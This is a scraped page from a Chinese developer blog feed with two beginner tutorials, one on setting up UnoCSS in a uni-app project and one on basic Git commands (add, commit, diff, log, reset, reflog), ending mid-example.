pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文档记录在 uni-app 项目中集成 UnoCSS 原子化 CSS 引擎的完整过程。</p>
<h2 data-id="heading-0">1. 安装依赖</h2>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D unocss @uni-helper/unocss-preset-uni
</code></pre>
<p><strong>核心依赖说明：</strong></p>
<ul>
<li><code>unocss</code>: UnoCSS 核心包</li>
<li><code>@uni-helper/unocss-preset-uni</code>: 专为 uni-app 优化的预设，自动转换 rpx 单位，兼容小程序/App 平台</li>
</ul>
<h2 data-id="heading-1">2. 配置 Vite 插件</h2>
<p>在 <code>vite.config.ts</code> 中引入 UnoCSS 插件：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
<span class="hljs-keyword">import</span> uni <span class="hljs-keyword">from</span> <span class="hljs-string">'@dcloudio/vite-plugin-uni'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">UnoCSS</span> = (<span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'unocss/vite'</span>)).<span class="hljs-property">default</span>; <span class="hljs-comment">// 动态导入 UnoCSS 插件，兼容 HBuilderX</span>
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">plugins</span>: [
      uni.<span class="hljs-title function_">default</span>(),
      <span class="hljs-title class_">UnoCSS</span>() <span class="hljs-comment">// 添加 UnoCSS 插件</span>
      <span class="hljs-comment">// 其他插件...</span>
    ]
  };
});
</code></pre>
<h2 data-id="heading-2">3. 创建 UnoCSS 配置文件</h2>
<p>在项目根目录创建 <code>uno.config.ts</code>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { presetUni } <span class="hljs-keyword">from</span> <span class="hljs-string">'@uni-helper/unocss-preset-uni'</span>;
<span class="hljs-keyword">import</span> { defineConfig, presetIcons, transformerDirectives, transformerVariantGroup } <span class="hljs-keyword">from</span> <span class="hljs-string">'unocss'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">presets</span>: [
    <span class="hljs-title function_">presetUni</span>(), <span class="hljs-comment">// uni-app 预设，必需</span>
    <span class="hljs-title function_">presetIcons</span>({
      <span class="hljs-attr">scale</span>: <span class="hljs-number">1.2</span>,
      <span class="hljs-attr">warn</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">extraProperties</span>: {
        <span class="hljs-attr">display</span>: <span class="hljs-string">'inline-block'</span>,
        <span class="hljs-string">'vertical-align'</span>: <span class="hljs-string">'middle'</span>
      }
    })
  ],
  <span class="hljs-attr">transformers</span>: [
    <span class="hljs-title function_">transformerDirectives</span>(), <span class="hljs-comment">// 支持 @apply 等指令</span>
    <span class="hljs-title function_">transformerVariantGroup</span>() <span class="hljs-comment">// 支持变体组简写，如 hover:(bg-gray-400 font-medium)</span>
  ]
});
</code></pre>
<p><strong>配置说明：</strong></p>
<ul>
<li><code>presetUni()</code>: 自动处理 rpx/px 单位转换，支持小程序/App 平台特性</li>
<li><code>presetIcons()</code>: 可选，支持图标集（需额外安装 <code>@iconify-json/*</code> 包）</li>
<li><code>transformerDirectives()</code>: 支持 Tailwind 风格的 <code>@apply</code> 指令</li>
<li><code>transformerVariantGroup()</code>: 简化变体书写，如 <code>hover:(text-red bg-blue)</code></li>
</ul>
<h2 data-id="heading-3">4. 引入 UnoCSS 样式</h2>
<h3 data-id="heading-4">方式一：在 <code>main.ts</code> 中引入（推荐 CLI 编译）</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { createSSRApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'uno.css'</span>; <span class="hljs-comment">// 引入 UnoCSS 生成的样式</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createApp</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createSSRApp</span>(<span class="hljs-title class_">App</span>);
  <span class="hljs-keyword">return</span> { app };
}
</code></pre>
<p><strong>平台差异说明：</strong></p>
<ul>
<li><strong>H5</strong>: 方式一</li>
<li><strong>小程序</strong>: 推荐方式一（<code>main.ts</code> 引入）</li>
<li><strong>App（Android/iOS）</strong>:
<ul>
<li>CLI 编译：方式一</li>
<li>HBuilderX 编译：方式二，将样式放在 <code>App.vue</code> 中以确保注入到 view 层</li>
</ul>
</li>
</ul>
<h2 data-id="heading-5">5. 使用 UnoCSS</h2>
<p>配置完成后即可在模板中使用工具类：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;view class="flex justify-center items-center h-screen"&gt;
    &lt;view class="bg-blue-500 text-white p-4 rounded-lg"&gt; Hello UnoCSS in uni-app! &lt;/view&gt;
  &lt;/view&gt;
&lt;/template&gt;
</code></pre>
<h2 data-id="heading-6">6. 常见问题</h2>
<h3 data-id="heading-7">6.1 样式在 App 端不生效</h3>
<p><strong>原因：</strong> uni-app 的 App 端分为 service 层和 view 层，<code>main.ts</code> 的引入只在 service 层生效。</p>
<p><strong>解决方案：</strong></p>
<ol>
<li>将 <code>import 'uno.css'</code> 移至 <code>App.vue</code> 的 <code>&lt;style&gt;</code> 块</li>
<li>或使用内联样式/自定义组件包裹</li>
</ol>
<h3 data-id="heading-8">6.2 HBuilderX 编译报错 "Cannot find module 'uno.css'"</h3>
<p><strong>原因：</strong> HBuilderX 不支持 <code>virtual:uno.css</code> 虚拟模块。</p>
<p><strong>解决方案：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 使用普通导入，不要使用 virtual: 前缀</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'uno.css'</span>;
</code></pre>
<h3 data-id="heading-9">6.3 单位不是 rpx</h3>
<p><strong>原因：</strong> 未使用 <code>presetUni()</code> 预设。</p>
<p><strong>解决方案：</strong>
确保 <code>uno.config.ts</code> 中包含：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-attr">presets</span>: [<span class="hljs-title function_">presetUni</span>()];
</code></pre>
<h3 data-id="heading-10">6.4 动态类名不生效</h3>
<p><strong>原因：</strong> UnoCSS 静态扫描无法识别动态拼接的类名。</p>
<p><strong>错误示例：</strong></p>
<pre><code class="hljs language-vue" lang="vue">&lt;view :class="`text-${color}-500`"&gt;&lt;/view&gt;
</code></pre>
<p><strong>正确做法：</strong></p>
<pre><code class="hljs language-vue" lang="vue">&lt;view :class="color === 'red' ? 'text-red-500' : 'text-blue-500'"&gt;&lt;/view&gt;
</code></pre>
<p>或使用 safelist 配置：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// uno.config.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">safelist</span>: [<span class="hljs-string">'text-red-500'</span>, <span class="hljs-string">'text-blue-500'</span>]
  <span class="hljs-comment">// ...</span>
});
</code></pre>
<h2 data-id="heading-11">7. 开发体验优化</h2>
<h3 data-id="heading-12">7.1 VSCode 插件</h3>
<p>安装 <code>UnoCSS</code> 插件获得：</p>
<ul>
<li>类名自动补全</li>
<li>类名悬停预览</li>
<li>类名颜色高亮</li>
</ul>
<h3 data-id="heading-13">7.2 UnoCSS Inspector</h3>
<p>开发模式下访问 <code>http://localhost:5173/__unocss</code> 查看：</p>
<ul>
<li>当前生成的所有样式</li>
<li>使用的工具类统计</li>
<li>样式文件大小</li>
</ul>
<h3 data-id="heading-14">7.3 配置别名</h3>
<p>在 <code>uno.config.ts</code> 中自定义简写：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">shortcuts</span>: {
    <span class="hljs-attr">btn</span>: <span class="hljs-string">'px-4 py-2 rounded bg-blue-500 text-white hover:bg-blue-600'</span>,
    <span class="hljs-attr">card</span>: <span class="hljs-string">'bg-white rounded-lg shadow p-4'</span>
  }
});
</code></pre>
<p>使用：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;view class="btn"&gt;按钮&lt;/view&gt;
&lt;view class="card"&gt;卡片&lt;/view&gt;
</code></pre>
<h2 data-id="heading-15">8. 性能优势</h2>
<p>相比传统 CSS 方案，UnoCSS 在 uni-app 中的优势：</p>
<ol>
<li><strong>按需生成</strong>：只生成使用到的样式，最终包体积更小</li>
<li><strong>零运行时</strong>：编译时生成，无运行时开销</li>
<li><strong>统一规范</strong>：团队成员使用相同工具类，样式一致性更好</li>
<li><strong>跨平台兼容</strong>：自动处理不同平台的单位差异（rpx/px）</li>
</ol>
<h2 data-id="heading-16">9. 参考资源</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Funocss.dev%2F" target="_blank" title="https://unocss.dev/" ref="nofollow noopener noreferrer">UnoCSS 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Funi-helper%2Funocss-preset-uni" target="_blank" title="https://github.com/uni-helper/unocss-preset-uni" ref="nofollow noopener noreferrer">uni-helper UnoCSS 预设</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Funocss.dev%2Finteractive%2F" target="_blank" title="https://unocss.dev/interactive/" ref="nofollow noopener noreferrer">UnoCSS Interactive Docs</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Git入门]]></title>    <link>https://juejin.cn/post/7579562949629788195</link>    <guid>https://juejin.cn/post/7579562949629788195</guid>    <pubDate>2025-12-04T08:41:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579562949629788195" data-draft-id="7579546893191675919" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Git入门"/> <meta itemprop="keywords" content="Git"/> <meta itemprop="datePublished" content="2025-12-04T08:41:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小喻yushi"/> <meta itemprop="url" content="https://juejin.cn/user/4267624503710218"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Git入门
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4267624503710218/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小喻yushi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:41:37.000Z" title="Thu Dec 04 2025 08:41:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">git的安装</h2>
<p>官网: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgit-scm.com%2F" target="_blank" title="https://git-scm.com/" ref="nofollow noopener noreferrer">git-scm.com/</a></p>
<p><strong>git安装</strong></p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">root@vm1 ~</span>]<span class="hljs-meta"># yum install git​</span>
[<span class="hljs-meta">root@vm1 ~</span>]<span class="hljs-meta"># git --versiongit version 1.8.3.1</span>
</code></pre>
<p><strong>查看参数帮助</strong></p>
<pre><code class="hljs language-csharp" lang="csharp">查看参数帮助
[<span class="hljs-meta">root@vm1 ~</span>]<span class="hljs-meta"># git --help  </span>
git的操作可以说只需要git一条命令加参数即可
</code></pre>
<h2 data-id="heading-1">git应用</h2>
<h3 data-id="heading-2">git身份设置</h3>
<p>因为git是分布式版本控制系统,不同的人提交代码需要区分,所以每个人都要设置一个身份标识。如果不设置的话谁会知道你这个开发者是张三，李四，还是王五呢?</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[root@vm1 ~]</span><span class="hljs-comment"># git config --global user.name "daniel"</span>
<span class="hljs-section">[root@vm1 ~]</span><span class="hljs-comment"># git config --global user.email "daniel@itcast.cn"</span>
<span class="hljs-section">[root@vm1 ~]</span><span class="hljs-comment"># git config --global color.ui true</span>

<span class="hljs-section">[root@vm1 ~]</span><span class="hljs-comment"># git config --list</span>
<span class="hljs-attr">user.name</span>=daniel
<span class="hljs-attr">user.email</span>=daniel@itcast.cn
<span class="hljs-attr">color.ui</span>=<span class="hljs-literal">true</span>
</code></pre>
<h3 data-id="heading-3">暂存区</h3>
<p><strong>==暂存区==</strong>(stage或index): 也有叫**==缓存区==**</p>
<p>暂存区就看作<strong>是一个缓区区域，临时保存你的改动</strong>。</p>
<p>如果在工作目录创建了一个新文件，需要将新文件添加到暂存区。</p>
<h4 data-id="heading-4">添加文件到暂存区</h4>
<p>1, 准备一个文件</p>
<pre><code class="hljs language-perl" lang="perl">[root@vm1 GitTest]<span class="hljs-comment"># cat 1.py </span>
<span class="hljs-keyword">print</span>(<span class="hljs-string">"hello world"</span>)
</code></pre>
<p>2, 使用<code>git add</code>命令提交到暂存区（逆向操作为<code>git rm --cached 1.py</code>)</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># git add 1.py</span>
</code></pre>
<p>3, 提交第一个文件后,版本库.git子目录里就多了一个index</p>
<pre><code class="hljs language-perl" lang="perl">[root@vm1 GitTest]<span class="hljs-comment"># ls .git/</span>
branches  config  description  HEAD  hooks  <span class="hljs-keyword">index</span>  info  objects  refs
</code></pre>
<p>4, 使用<code>strings</code>命令查看可以看到<code>git add</code>的文件列表</p>
<pre><code class="hljs language-perl" lang="perl">[root@vm2 GitTest]<span class="hljs-comment"># strings .git/index </span>
DIRC
<span class="hljs-number">1</span>.py	这里可以看到<span class="hljs-number">1</span>.py文件添加到了<span class="hljs-keyword">index</span>文件里了
</code></pre>
<h3 data-id="heading-5">git版本控制</h3>
<h4 data-id="heading-6">提交文件(第1个版本)</h4>
<p>代码文件需要**==commit==**提交后才能纳入版本控制。</p>
<p>1, 可以使用<code>git status</code>查看工作目录里有哪些文件需要提交</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># git status</span>
<span class="hljs-meta"># On branch master</span>
<span class="hljs-meta">#</span>
<span class="hljs-meta"># Initial commit</span>
<span class="hljs-meta">#</span>
<span class="hljs-meta"># Changes to be committed:</span>
<span class="hljs-meta">#   (use "git rm --cached &lt;file&gt;..." to unstage)</span>
<span class="hljs-meta">#</span>
<span class="hljs-meta">#	new file:   1.py</span>
<span class="hljs-meta">#</span>
</code></pre>
<p>2, 使用<code>git commit</code>提交; -m 后接提交的说明信息</p>
<pre><code class="hljs language-sql" lang="sql">[root<span class="hljs-variable">@vm1</span> GitTest]# git <span class="hljs-keyword">commit</span> <span class="hljs-operator">-</span>m "提交1.py"
[master (root<span class="hljs-operator">-</span><span class="hljs-keyword">commit</span>) <span class="hljs-number">4e67190</span>] 提交<span class="hljs-number">1.</span>py
 <span class="hljs-number">1</span> file changed, <span class="hljs-number">1</span> insertion(<span class="hljs-operator">+</span>)
 <span class="hljs-keyword">create</span> mode <span class="hljs-number">100644</span> <span class="hljs-number">1.</span>py
</code></pre>
<p>3, 再次<code>git status</code>查看状态,没有需要提交的文件了</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># git status</span>
<span class="hljs-meta"># On branch master</span>
nothing to commit, working directory clean
</code></pre>
<h4 data-id="heading-7">修改再提交(第2个版本)</h4>
<p>1, 修改1.py文件,我这里加了一句print("hello python")</p>
<pre><code class="hljs language-perl" lang="perl">[root@vm1 GitTest]<span class="hljs-comment"># cat 1.py</span>
<span class="hljs-keyword">print</span>(<span class="hljs-string">"hello world"</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">"hello python"</span>)
</code></pre>
<p>2, 使用<code>git status</code>查看，信息告诉我们1.py被修改了</p>
<pre><code class="hljs language-perl" lang="perl">[root@vm1 GitTest]<span class="hljs-comment"># git status</span>
<span class="hljs-comment"># On branch master</span>
<span class="hljs-comment"># Changes not staged for commit:</span>
<span class="hljs-comment">#   (use "git add &lt;file&gt;..." to update what will be committed)</span>
<span class="hljs-comment">#   (use "git checkout -- &lt;file&gt;..." to discard changes in working directory)</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#	modified:   1.py</span>
<span class="hljs-comment">#</span>
<span class="hljs-keyword">no</span> changes added to commit (<span class="hljs-keyword">use</span> <span class="hljs-string">"git add"</span> <span class="hljs-keyword">and</span>/<span class="hljs-keyword">or</span> <span class="hljs-string">"git commit -a"</span>)
</code></pre>
<p>3, 使用<code>git diff</code>查看修改了什么</p>
<pre><code class="hljs language-perl" lang="perl">[root@vm1 GitTest]<span class="hljs-comment"># git diff 1.py</span>
diff --git a/<span class="hljs-number">1</span>.py b/<span class="hljs-number">1</span>.py
<span class="hljs-keyword">index</span> <span class="hljs-number">8</span>cde782..<span class="hljs-number">5</span>da7641 <span class="hljs-number">100644</span>
--- a/<span class="hljs-number">1</span>.py
+++ b/<span class="hljs-number">1</span>.py
@@ -<span class="hljs-number">1</span> +<span class="hljs-number">1</span>,<span class="hljs-number">2</span> @@
 <span class="hljs-keyword">print</span>(<span class="hljs-string">"hello world"</span>)
+<span class="hljs-keyword">print</span>(<span class="hljs-string">"hello python"</span>)

[root@vm1 GitTest]<span class="hljs-comment"># git add 1.py</span>
[root@vm1 GitTest]<span class="hljs-comment"># git commit -m "添加了一行代码打印hello python"</span>
[master 0e9371b] 添加了一行代码打印hello python
 <span class="hljs-number">1</span> file changed, <span class="hljs-number">1</span> insertion(+)
</code></pre>
<h4 data-id="heading-8">再修改再提交(第3个版本)</h4>
<pre><code class="hljs language-perl" lang="perl">再增加一句代码<span class="hljs-keyword">print</span>(<span class="hljs-string">"hello linux"</span>)
[root@vm1 GitTest]<span class="hljs-comment"># cat 1.py</span>
<span class="hljs-keyword">print</span>(<span class="hljs-string">"hello world"</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">"hello python"</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">"hello linux"</span>)

[root@vm1 GitTest]<span class="hljs-comment"># git add 1.py</span>

[root@vm1 GitTest]<span class="hljs-comment"># git commit -m "添加了一行代码打印hello linux"</span>
[master b679b01] 添加了一行代码打印hello linux
 <span class="hljs-number">1</span> file changed, <span class="hljs-number">1</span> insertion(+)
</code></pre>
<p><strong>小结:</strong></p>
<ul>
<li>
<p>工作目录中写好的代码文件需要先<code>git add 文件名</code>添加到暂存区,再<code>git commit 文件名</code>提交。以后每次修改都要重复前两步。</p>
</li>
<li>
<p><code>git status</code>查看工作目录中的状态</p>
</li>
<li>
<p><code>git diff 文件名</code>查看文件修改了什么</p>
</li>
</ul>
<h4 data-id="heading-9">查看提交历史</h4>
<p>1, 使用<code>git log</code>查看提交的历史版本信息</p>
<pre><code class="hljs language-sql" lang="sql">[root<span class="hljs-variable">@vm1</span> GitTest]# git log
<span class="hljs-keyword">commit</span> b679b01f2ee42c1c4a7e14ed5d37e02da131a98e
Author: daniel <span class="hljs-operator">&lt;</span>daniel<span class="hljs-variable">@itcast</span>.cn<span class="hljs-operator">&gt;</span>
<span class="hljs-type">Date</span>:   Wed Jan <span class="hljs-number">16</span> <span class="hljs-number">14</span>:<span class="hljs-number">00</span>:<span class="hljs-number">44</span> <span class="hljs-number">2019</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span>

    添加了一行代码打印hello linux

<span class="hljs-keyword">commit</span> <span class="hljs-number">0e9371</span>bfdbc27049c31017773248ae8333b5bf3f
Author: daniel <span class="hljs-operator">&lt;</span>daniel<span class="hljs-variable">@itcast</span>.cn<span class="hljs-operator">&gt;</span>
<span class="hljs-type">Date</span>:   Tue Jan <span class="hljs-number">15</span> <span class="hljs-number">23</span>:<span class="hljs-number">43</span>:<span class="hljs-number">58</span> <span class="hljs-number">2019</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span>

    添加了一行代码打印hello python

<span class="hljs-keyword">commit</span> <span class="hljs-number">4e67190</span>ec3c57f1708702c9eca5aebe88017bdd2
Author: daniel <span class="hljs-operator">&lt;</span>daniel<span class="hljs-variable">@itcast</span>.cn<span class="hljs-operator">&gt;</span>
<span class="hljs-type">Date</span>:   Tue Jan <span class="hljs-number">15</span> <span class="hljs-number">23</span>:<span class="hljs-number">23</span>:<span class="hljs-number">26</span> <span class="hljs-number">2019</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span>

    提交<span class="hljs-number">1.</span>py
</code></pre>
<p>2, 使用<code>git log --pretty=oneline</code>查看提交的历史版本信息, 查看的显示信息更简洁。</p>
<p>前面字符串你可以看作就是一个<strong>版本号</strong>(commit id)。</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">root@vm1 GitTest</span>]<span class="hljs-meta"># git log --pretty=oneline</span>
b679b01f2ee42c1c4a7e14ed5d37e02da131a98e 添加了一行代码打印hello linux
<span class="hljs-number">0e9371</span>bfdbc27049c31017773248ae8333b5bf3f 添加了一行代码打印hello python
<span class="hljs-number">4e67190</span>ec3c57f1708702c9eca5aebe88017bdd2 提交<span class="hljs-number">1.</span>py
</code></pre>
<h4 data-id="heading-10">版本回退与还原</h4>
<p>1, 使用<code>git reset --hard HEAD^</code>回退到上一个版本(也就是第2个版本)</p>
<pre><code class="hljs language-perl" lang="perl">[root@vm1 GitTest]<span class="hljs-comment"># git reset --hard HEAD^</span>
HEAD is now at 0e9371b 添加了一行代码打印hello python

[root@vm1 GitTest]<span class="hljs-comment"># cat 1.py </span>
<span class="hljs-keyword">print</span>(<span class="hljs-string">"hello world"</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">"hello python"</span>)
</code></pre>
<p>2, 使用<code>git reset --hard 第3个版本号</code> 还原到第3个版本。</p>
<p>但如果我忘了第3个版本号是什么了,使用<code>git reflog</code>查看所有的操作历史。</p>
<pre><code class="hljs language-perl" lang="perl">[root@vm1 GitTest]<span class="hljs-comment"># git reflog</span>
0e9371b HEAD@{0}: <span class="hljs-keyword">reset</span>: moving to HEAD^
b679b01 HEAD@{1}: commit: 添加了一行代码打印hello linux
0e9371b HEAD@{2}: commit: 添加了一行代码打印hello python
<span class="hljs-number">4</span>e6719<span class="hljs-number">0</span> HEAD@{3}: commit (initial): 提交<span class="hljs-number">1</span>.py
</code></pre>
<p>3, 还原到第3个版本</p>
<pre><code class="hljs language-perl" lang="perl">[root@vm1 GitTest]<span class="hljs-comment"># git reset --hard b679b01</span>
